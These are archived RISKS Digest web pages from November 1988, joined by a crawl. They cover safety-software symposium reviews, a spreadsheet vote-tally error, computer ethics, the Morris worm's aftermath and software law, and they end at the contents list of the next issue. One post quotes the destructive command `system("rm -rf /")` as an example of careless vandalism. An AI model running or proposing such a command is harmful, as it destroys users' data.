
Dahll, G., Mainka, U. and J. Maertz*, "Tools for the Standardised
Software Safety Assessment (The SOSAT Project)"
  This was a description of an environment to aid the licensor of
  safety-related code. It starts with the final object code of the application
  to be assessed. This is disassembled and instrumented for comparison with the
  specification. There are also capabilities for analyzing the disassembled
  code with commercial tools (e.g., SPADE -- See O'Neill's talk below).  SOSAT
  itself supports 4 types of analysis: Static Analysis, including structure,
  path and data flow analysis; White-box test data generation; Symbolic
  Execution; and Real-time timing analysis.  The latter was the subject of a
  presentation by G.  Rabe at SAFECOMP '88. It's basically a sophisticated
  profiler that interfaces directly to the target hardware.  [SOSAT clearly has
  much development ahead, but there seems to be a good start in considering the
  sort of tools that the licensing examiner may find useful in evaluating
  safety-related software.]

Bergerand, J.L. and E. Pilaud, "SAGA - A Software Development
Environment for Dependability Automatic Controls"
  The French cousin of SOSAT is SAGA. This environment is focused more on the
  development of the code than the licensing. It is basically intended to
  improve the designs (by supporting design-level analyses) and to support
  reuse of software modules (with the theory that the more a module is re-used,
  the better it gets). SAGA has been used to support the development of nuclear
  power plant control code.  It doesn't seem to improve productivity, but the
  quality of the resultant code seems to be improved.

Fedra, K., "Information and Decision Support Systems for Risk
Analysis"
  This was a report on a tool to support qualitative risk assessment and
  disaster planning. It provides a graphic interface to simulate disastrous
  events and link to databases on related risks, along with geology, geography,
  weather and population demographics of the region in question.  It's geared
  for non-expert users to support industrial safety decisions.  A trial system
  has been used in the People's Republic of China.  The system also has an
  expert system to support hazard management techniques and support for safety
  analysis tools like fault-tree analysis. [This was without doubt the
  prettiest presentation of the symposium, with impressive color graphics
  showing simulations of Chernobyl, ground-water contamination and population
  evacuation. However, there were a lot of questions at the symposium about the
  fidelity of the underlying models used. The basic defense by Dr. Fedra was
  that the tool does better than the current techniques, supporting safely
  smaller safety margins. I'm not entirely sure I believe that, given the
  oft-cite propensity of non-expert users to trust computers too much.]

Taylor, J.R. "Reducing the Risks from Systems Documentation
Errors"
  The motivation for this work was a case where inaccurate documentation for
  a circuit board that was part of the firing control system resulted in a
  faulty installation that caused a gun turret on a Danish naval vessel to
  over-revolve and fire at its captain. A subsequent study found that errors in
  documentation of safety-related subsystems are quite frequent.  To reduce
  these errors, Taylor created the ANNADOC system.  The documents are
  translated by the users into a simplified technical English, which is in turn
  translated by the system into a set of finite state machines. The FSMs are
  used to simulate the system so that the documented behavior may be compared
  with the specified or actual behavior.
  [This talk was interesting because of a rarely-considered aspect of safety,
  namely the affect of the documentation. A member of the audience cited an
  additional example, a case where incorrect wiring diagrams (known to be
  incorrect by the management involved and stamped "DO NOT USE", but not
  corrected) were used in the maintenance of a nuclear reactor. The erroneous
  wiring caused a reactor trip.]

Panel Discussion: "Is probabilistic thinking reasonable in
software safety applications?"
  The Proponents of probabilistic thinking cited studies that humans are not
  deterministic in their behavior, and the desire to be able to use models
  similar to those used in hardware.  The Opponents countered by saying that we
  really don't have much basis for supporting probabilistic software
  reliability statements -- if a failure is found during software safety
  assessment, any reasonable licensing authority will require modification of
  the software to prevent that failure. The favored approach for the opponents
  seemed to by careful development and rigorous analysis of the software.  A
  poll of the audience after the discussion showed that a large majority didn't
  feel that probabilistic thinking was reasonable for software.

Bloomfield, R.E. and P.K.D. Froome, "The Assessment and Licensing
of Safety Related Software"
  [This is a presentation of an extensive tech report "Licensing Issues
  Associated with the Use of Computers in the Nuclear Industry", R.E.
  Bloomfield and W.D. Ehrenberger, Tech Report EUR11147en, Commission of the
  European Communities, Nuclear Science and Technology, 1988.  ISBN
  92-825-8005-9.  Lots of interesting summaries of the use of computers in
  various nations for nuclear and safety-related applications.  It has a stated
  purchase price of $24.50 from the Office for Official Publications of the
  European Communities, L-2985 Luxembourg]

  Certification is a formal agreement of the fitness of a system to a
  specific purpose. There is some transfer of responsibility involved in the
  certification process, morally if not legally.  Certification is normally a
  large process, with much delegation and summarization.  There may be
  pressures on the certification team to avoid articulating concerns (political
  and social pressure), to automatically accept subsystems that were generated
  in response to the certification teams comments, and to ignore a series of
  small problems that collectively destroy the certifiers confidence in the
  system.  With respect to software, there are several persistent questions:
   + What is the acceptance of risk among the populace and how do
     the certifiers acknowledge that?
   + How does risk analysis reflect value systems?
   + What are the technological limits?
   + What role should numbers play in certification? If the probabilities are
     dominated by common-mode or human-error effects, how should they be
     evaluated?
   + Should individuals and institutions need to be certified, as well as 
     systems?
  Recent work (especially the UK Defense standard that will be
  published next year) focuses on formal analysis approaches:
  Z, VDM, HOL, CSS, CSP and use of temporal logics.
  [Much here that will be familiar to regular RISKS readers, but
  useful to see someone from the licensing side articulating
  these concerns.  One member in the audience raised the issue of
  how one can recognize, or measure, good software engineering practice.]

O'Neill, I.M., Summers, P.G., Clutterbuck, D.L., and P.F. Farrow
"The Formal Verification of Safety-Critical Assembly Code"

  A report of a project at Rolls-Royce to certify jet aircraft control code
  using SPADE.  The assembly code was mechanically translated into FDL for
  analysis, with annotation of proof obligations automatically inserted during
  the translation. A flow analysis of the FDL code raised queries that were
  resolved by the implementation team before the proof was conducted.  Pre and
  Post-conditions were derived from module "fact sheets" and manually inserted
  into the FDL code.  The generation of further annotations for the proof was
  done automatically, but the proof itself involved substantial human
  interaction.  Approximately 100 modules were proven.  Total correctness was
  not proven for all modules, but only about 12 involved loops at all, and the
  certification team assured themselves that the loops had a fixed limit on the
  iterations. Each module was verified individually, with no consideration of
  the inter-modular data flow.

Concluding Session (W. Ehrenberger):
  A poll of the attendees of the symposium shows concern for the following
problems:
    + Specification of Systems and tools to support this
    + Limits of understanding of the role of software in Safety
    + Man/Machine interface problems
    + Risk reducing tools (How do we qualify the results)
    + Diverging Technology (General approaches seem largely flawed)
    + Reluctance of Industry to use new techniques
    + Robust metrics and measurement (and how it relates to
      political acceptance of risk)
    + Identification of Critical system components and critical failures
[Ehrenberger noted that many of these concerns were unchanged since the first
SAFECOMP in 1979 -- a recognition that we have a long way to go.  It seemed
to me that this was a fair summation of the entire symposium.  Some
approaches look promising, but we have a long way to go to really address the
problems.  The papers were strong in recognizing the issues, but there was a
large gap between the acknowledged problems and the proposed solutions.]

*Note: Umlauts are interpreted by using the "following e"
convention. Thus, a-umlaut is written as ae, etc.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.77.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.79.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-31</DOCNO>
<DOCOLDNO>IA012-000131-B035-161</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.79.html 128.240.150.127 19970217023926 text/html 24002
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:37:56 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 79</TITLE>
<LINK REL="Prev" HREF="/Risks/7.78.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.80.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.78.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.80.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 79</H1>
<H2> Wednesday 16 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Vote Count Error
</A>
<DD>
<A HREF="#subj1.1">
Kenneth R Jongsma
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer Ethics Class 
</A>
<DD>
<A HREF="#subj2.1">
Leslie Chalmers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Teaching "Ethics" 
</A>
<DD>
<A HREF="#subj3.1">
Eric Roskos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: NSA attempts to restrict virus information 
</A>
<DD>
<A HREF="#subj4.1">
Theodore Ts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The FBI Wants You (if you were virus-ized) 
</A>
<DD>
<A HREF="#subj5.1">
Tom Zmudzinski via Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Access and authorization 
</A>
<DD>
<A HREF="#subj6.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Laws of computer evidence 
</A>
<DD>
<A HREF="#subj7.1">
Barry C. Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Call for comments on uniformity legislation for software    
</A>
<DD>
<A HREF="#subj8.1">
Conleth S. O'Connell via Alan Kaminsky
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Vote Count Error
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal.com!Kenneth_R_Jongsma@unix.SRI.COM">
portal!cup.portal.com!Kenneth_R_Jongsma@unix.SRI.COM
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 15-Nov-88 15:07:56 PST

The following article appeared in the local paper. I'm sure it will be
the first of many to appear after the recent elections. I will try to
refrain from commenting. There are so many obvious issues raised here!

                Tally Error Gives Logan Clear Win
                ---------------------------------
                  (Exerpted Without Permission)

Attorney Benjamin Logan won the write-in race for Grand Rapids District
Judge by 461 votes - not just 20, the Grand Rapids city clerk's office
announced today after finding the error.

The computer processing system designed to handle the write-in race did not
pick up the vote tallies from five precincts on the city's southeast side -
Logan's strongest area.

Those votes make it virtually certain that the Board of Canvassers' rulings
on name variations will not change the outcome.

City Clerk Sandra Wright said no other races were affected by the computer 
problem. A seperate computer program counted ballot cards for the other races.
The system used for the write-in election was a Lotus 1-2-3 computer program
developed by local staff, she said.

Tom McQuillan, director of management information systems for Grand Rapids, said

the error apparently stemmed from a problem with the computer program, which
ordered the computer to tally 3rd Ward votes starting with the sixth precinct,
rather than the first. "It's not what we call a computer error," he said. "It's
a human error."

Wright said she discovered the problem Saturday night while adding up the 
figures from the race manually. "I found the 3rd Ward was inconsistent," she
said. "I was further able to isolate that we were not picking up tallies
in Precincts 1,2,3,4 and 5."

(Explanation of Judges duties, salary, and reason for write-in contest deleted)

McQuillan said the error may have been inserted in the program after the city
staff ran it through a test run. The program was (then) modified so subtotals
could be released while the votes were being tallied and the original computer
formulas may not have been rechecked. ("But Boss, I just need to make this
minor change. It can't possibly hurt anything!)

Voters in the five precincts that had not been counted cast 604 votes for Logan
and 163 votes for Christensen. (Enough to change what was a virtual dead heat
that would have had to have been decided by the Board deciding what a voter's
"intent" was when they misspelled a name on the ballot, into a solid victory
for Logan.)

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Computer Ethics Class
</A>
</H3>
<address>
&lt;<A HREF="mailto:Chalmers@DOCKMASTER.ARPA">
Chalmers@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 15:48 EST
</i><PRE>

Regarding Bob Barger's entry, "Comments sought on proposed computer ethics
course" (RISKS 7.75), I was frankly shocked at the statement "There will be no
class meetings, except for the first and last sessions.  Students will instead
utilize electronic bulletin boards on the university's mainframe computer
network to research and discuss issues."

It has been a long time since my college days and I may be hopelessly out of
date on these matters, but why on earth would one conduct any class, and
particularly one on ethics, without any class time?

One of the problems with the computer 'hackers' of today is their isolation
from others in society who might disagree with their point of view.  Allowing
students to 'participate' in a course via a terminal only encourages this
isolation.  While a majority of students might agree on what we would consider
ethical behavior, some will not.  It is important that such students be
subjected to the direct challenge of their classmates.  Group interaction is
critical for this purpose.

I would further suggest that Barger make a point of including in his class,
lectures by people who have suffered negative consequences from the activities
of individuals who do not believe that other computer users have any rights
other than those they grant themselves by building secure systems.  Just as a
judge recently ordered a notorious slumlord to spend time in his own buildings,
people who have a belief system that condones computer hacking should be forced
to face the victims of such activities.

In the case of computer ethics, there is very little that even those of us in
computer security can say is *unambiguously* "right" or "wrong".  There are
activities which we could agree are inconvenient or destructive for other users
of computer systems such as denial of service or erasure of files.  We could
even come up with some empirical evidence of the consequences of these
activities to prove that they are inconvenient or damaging (deadlines missed
because report was erased, man-hours, excuse me, person-hours spent locating
unauthorized code and purging system, etc.)  But I have read quotes from
'hackers' and even some participants in this forum suggesting their firm belief
that anyone who does not protect himself from hacking *deserves* what he gets.
It would seem to me that one of the objectives of an ethics class should be to
modify that point of view.

There are things which may be unambiguously "illegal" (though precious few),
but this is not the same thing at all.  As one who came of age in the '60s, I
can attest to the irrelevance of the legal system to people who believe in
their heart of hearts that the laws are wrong.  If we '60s students had blindly
accepted the notion that whatever is "illegal" is ipso facto "wrong", life
would be very different today.  Clearly, ethics has only a casual relationship
to legality.  The purpose of an ethics course should be to convince students of
the importance of a code of behavior and a social context is essential for
getting that message across.
                                                                      Leslie

The standard disclaimers apply.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Teaching "Ethics"
</A>
</H3>
<address>
Eric Roskos
&lt;<A HREF="mailto:roskos@ida.org ">
roskos@ida.org 
</A>&gt;
</address>
<i>
Wed, 16 Nov 88 16:01:14 EST
</i><PRE>

&gt; Perhaps if everyone were exposed to ethics courses, beginning in the
&gt; early grades and continuing through computer ethics courses and business
&gt; ethics courses, etc, then it would be clear `in the entire community
&gt; what is and what isn't ethical behavior.'

Unfortunately, this is much more complex than it first appears; I wonder how
many people who recommend "ethics courses" have ever taken an ethics course.

Henry Thoreau once observed that whenever he tried to argue rationally with
someone, the person would agree with him repeatedly up until the time his final
conclusion became evident, at which point the person would vehemently refuse to
accept the conclusion, eventhough he had accepted all the premises leading to
it.

This is the case with ethics.  People all agree that everyone should behave
"ethically," yet they refuse to agree on what precisely is ethical behavior.
In an Ethics course, the most you can do is discuss ethical paradigms, which
include systems of ethics in which it is entirely acceptable to engage in any
activity that benefits you ("situation ethics" are an example of this).
"Ethics" differs from "a specific set of ethical principles"; after all, "there
is honor among thieves".

This is not to say that I advocate irresponsible behavior; and, in fact, I
attended a college which had a working "honor system" and a working "code of
responsibility," and think they were successful in teaching ethical behavior to
the students.  I just don't think that calling for "ethics classes" is going to
accomplish the desired end.  And I don't think there is enough agreement on
what should be taught to do so.

Note, however, that the ACM has a code of ethics.  Perhaps we should focus on
more effectively conveying it, as I fairly often see people violate it in the
RISKS digest.

Eric Roskos, IDA (roskos@CS.IDA.ORG or Roskos@DOCKMASTER.ARPA)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: NSA attempts to restrict virus information
</A>
</H3>
<address>
Theodore Ts'o 
&lt;<A HREF="mailto:tytso@ATHENA.MIT.EDU">
tytso@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 02:45:16 EST
</i><PRE>

Steve Bellovin noted that the NSA was "exerting a greal deal of pressure
th have dissassembler output from the virus (to say nothing of C source)
available to as few people as possible...."  He then went on to say that
they were leaning on contacts, such as the president of the university,
etc.  Before people raise their hackles and get up to call the ACLU, I'd
like to make a few points:

First of all, the only incident that I know of where this happened was
at Purdue, where the NCSC (the public arm of the NSA) leaned on the
president to remove a copy of the disassembler output from an anonymous
ftp directory.  They went into hysterics when they thought that a copy
of C source code of the virus had been posted to phage, a mailing list
which has several hundreds of people on it, but they didn't (couldn't)
do anything about it.  (In actual fact, it was only a partial
decompilation of the virus --- about 15-20%.)  In fairness, they were
probably over-reacting after the initial shock/aftermath of the virus.  

If the NCSC has tried surpressing it elsewhere, I'd like to know about
it --- but it seems that Steve was generalizing from only one data
point.  Or perhaps he got the information from the Markoff column in
the NYT recently.  I really think that column was badly written or
perhaps badly edited --- someone apparently did not understand all of
the issues involved.

Secondly, trying to limit the source code to the decompiled virus is a
good thing.  If it were publicly distributed, there's a chance that some
person will find another security hole and just drop it into the virus
``body'' that the source code would provide.  In addition, they might
add some malicious code so that after 12 hours or so, would try to
destroy as many files as possible.  Someone might just disable the
fingerd and sendmail hack; the virus might still be able to propagate
far just cracking stupid password choices. 

There are also legal issues: if someone releases the code, and someone 
uses the code to make a really damaging virus, is the person who
released the code liable?  Does someone want to take that risk and find
out the hard way?

In addition, one of my colleagues is currently writing a paper that will 
describe, in detail, all of the algorithms used by the virus.  The paper
will be published for general reading, and should be infinitely more
useful than the actual source code.  That is, there is no legitimate
purpose that would require the source code over the algorithms.   The
only purpose for obtaining the source code itself would be to build
another virus. 

If a determined cracker wanted make another virus, yes, he could use the
algorithms.  But as the paper will demonstrate, those algorithms weren't the
best anyway, and very little will stop someone that determined.  It appears
that it took RTM at least a few weeks to write it from scratch --- and he knew
Unix fairly well.

Not releasing the source code is intended to stop the ``Freshman Twit''
who knows how to type  `system("rm -rf /");` and `cc`.  Unforunately,
many universities (including MIT) are connecting to the Internet, and we
get a constant stream of new-comers to the Internet community --- most
of them have only PC programming as their background, and no concept as
to the ethics involved.  Who knows what they might do?

According to a colleague who was at the ``Virus Conference'' at
Washington called by the NCSC, they had agreed with our decision (which
we had made before talking to them) of only distributing the algorithms
and not the source code to the virus. 
						- Ted

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
The FBI Wants You (to call if you were virus-ized)
</A>
</H3>
<address>
&lt;<A HREF="mailto:davy@riacs.edu">
davy@riacs.edu
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 08:12:57 -0800
</i><PRE>

The enclosed message was sent to the TCP-IP list.  As per its request
to give it maximum distribution, I am forwarding it to RISKS.  What
with all the speculation on how the FBI is going to (try to)
prosecute, it is useful for its information content as well.

I would strongly urge everyone who wasted their time cleaning up after
this mess to respond.  Regardless of whether you feel Morris (or
whoever) is a hero or a scumbag, it is important to note the last line
of the message - if we want the FBI to help us when something truly
serious happens (and you know it will...), then we had better show
them we're willing to help them now.  Otherwise, they may just ignore
us next time since we were unwilling to cooperate.

--Dave Curry

From: TomZ@DDN1.ARPA
Subject: FBI Contact re: November Internet Virus
Date: 14 Nov 88 05:03:00 GMT

         Were YOU hit by the November Internet Virus?
 
                      The FBI wants to hear from you!
 
The Federal Bureau of Investigation is attempting to gather critical
information necessary to pursue this case under the Computer Fraud and
Abuse Act of 1986.  (This is the statute that makes it a federal crime
to penetrate a computer owned by or run on the behalf of the Government.)
 
The FBI Case Agent has asked the Defense Data Network Project Management
Office to collect the names of organizations and Points of Contact (names
and phone numbers) that were hit by the Virus.  The Defense Communications
Agency has established an E-Mail address for this collection at:
 
                       INFO-VACC [at] BEAST.DDN.MIL
 
    Points of Contact should expect to be contacted by their local FBI
    agents for dispositions due to the wide geographical area involved.
 
 
                     I * M * P * O * R * T * A * N * T
 
            The FBI needs this information to pursue the case.
 
      If we expect their aid in the future, we need to help them now.
 
PLEASE GIVE THIS MESSAGE MAXIMUM DISTRIBUTION; NOT EVERYONE IS ON "TCP-IP"!
 
/s/  Tom Zmudzinski, DDN Security Officer    (703) 285-5206

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
access and authorization 
</A>
</H3>
<address>
Joe Morris (jcmorris@mitre.arpa) 
&lt;<A HREF="mailto:jcmorris@mitre.arpa">
jcmorris@mitre.arpa
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 17:34:04 EST
</i><PRE>

In Risks 7:77 Debbus Rears comments:

&gt;   The main problem with making worms/viruses illegal is drafting the laws.
&gt; What is authorized access?  If a friend of mine on Computer "A" gives me his
&gt; password; does that in itself give me authorized access?  Since I am on the
&gt; milnet I can fing, ftp anonymously, send mail to lots of computers.  All of
&gt; these actions I have implied authorization.

There seems to be a problem here in distinguishing between authority to 
access a facility and the authority to perform some action once the access
has been successful.  For example, if I am allowed to go into the stacks of
a library, that does not imply that I have authorization to tear out pages
from books I find there.

Most computer facilities prohibit the use of an account by anyone other than
the individual to whom it was assigned.  Your friend probably had no 
authority to give you the password, and you have no authority to use it.
The fact that you can masquerade as your friend by supplying his userid
and password in no way implies legality of the action.

The TAC access cards from DDN have a section which reads:

   Authorized use of the DDN is limited to the conduct of or support
   of government business.

So if you start a chain of events which you know will involve DDN facilities
(even if you aren't directly connected to it) then your authorization is
limited to activities on behalf of Uncle.  The fact that you're on MILNET
means only that you (supposedly) have authority to be on MILNET.  What
you do once you're there is a different question.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
laws of computer evidence
</A>
</H3>
<address>
"Barry C. Nelson" 
&lt;<A HREF="mailto:bnelson@ccb.bbn.com">
bnelson@ccb.bbn.com
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 20:13:55 EST
</i><PRE>

How fascinating is this collision of the mathematical with the societal --
where the common law meets the computer (user)! Two recent cases in point...

Does the UK Vehicle Ident system differ much from the already-admissible credit
transaction records. "By the records, something you control (car, credit/ATM
card) was used at that location, so is there any proof it wasn't used by YOU?"

On another topic, the problem facing the FBI may not be so much one of finding
a statute that Morris violated as being able to construct the necessary case
based on acceptable (and attributable) EVIDENCE that he actually broke that law. 

Rules of Evidence indicate that "any printout or other computer output readable
by sight, shown to reflect the data accurately, is an 'original'" for purposes
of demonstrating existence of "writings and recordings" as evidence. 

This implies that copying a program to another computer creates the source of
another "original". If the creation and use of the first original was a crime,
was creation and use of subsequent "originals" also a crime? Only some? Which?

If someone could point me to a good text on the topic, I'd appreciate it.

Barry C. Nelson

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Call for comments on uniformity legislation for software
</A>
</H3>
<address>
&lt;<A HREF="mailto:ark%hoder@CS.RIT.EDU">
ark%hoder@CS.RIT.EDU
</A>&gt;
</address>
<i>
Tue, 15 Nov 88 09:51:10 EST
</i><PRE>

[The message below recently appeared in the Usenet comp.software-eng newsgroup.
Since I think it will be interesting to RISKS participants I have submitted it
verbatim.  -Alan Kaminsky, Rochester Institute of Technology]

    [Please respond directly to Conleth O'Connell and ask that the results
    be made available to RISKS.  PGN]

Conleth S. O'Connell at Ohio State University writes:

I have been asked to get opinions (both positive and negative) on the
feasibility of drafting "uniformity legislation" for software.

Uniformity legislation affects everyone in the U.S. and its
territories equally.  While there may be variances in the law of a
particular state, the fundamental law will be the same everywhere.
For example, uniformity legislation in the U.S. requires that cars
meet certain minimum pollution standards, but individual states are
free to mandate higher standards.

A government committee is now considering if uniformity legislation
for software is necessary, warranted, or desirable.  For example,
should software suppliers be required to warranty their products?
should suppliers be required to inform users of known bugs?  should
bug-fixes be distributed at cost? who should be responsible for
viruses in object code? etc.

If you have an opinion on software uniformity legislation, please
express it publicly, and I will forward your thoughts to one of the
committee members.  If you feel moved to "second" an opinion already
expressed, please send me e-mail.

Thank you,
Conleth S. O'Connell 	Department of Computer and Information Science
cso@cis.ohio-state.edu		The Ohio State University
				      2036 Neil Ave. 
 			       Columbus, OH USA 43210-1277

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.78.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.80.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-32</DOCNO>
<DOCOLDNO>IA012-000131-B035-177</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.80.html 128.240.150.127 19970217023944 text/html 19427
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:38:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 80</TITLE>
<LINK REL="Prev" HREF="/Risks/7.79.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.81.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.79.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.81.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 80</H1>
<H2> Friday 18 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer glitch causes Fresno `flood' 
</A>
<DD>
<A HREF="#subj1.1">
Ira Greenberg via PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Election Computing 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Vote Count Error 
</A>
<DD>
<A HREF="#subj3.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Casiers numeriques!  (Digital lockers!) 
</A>
<DD>
<A HREF="#subj4.1">
Marc Vilain
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Toll Road information collection 
</A>
<DD>
<A HREF="#subj5.1">
David Phillip Oster
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks of non-technologists' reactions to technological failures    
</A>
<DD>
<A HREF="#subj6.1">
Fred McCall on Al Fasoldt
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
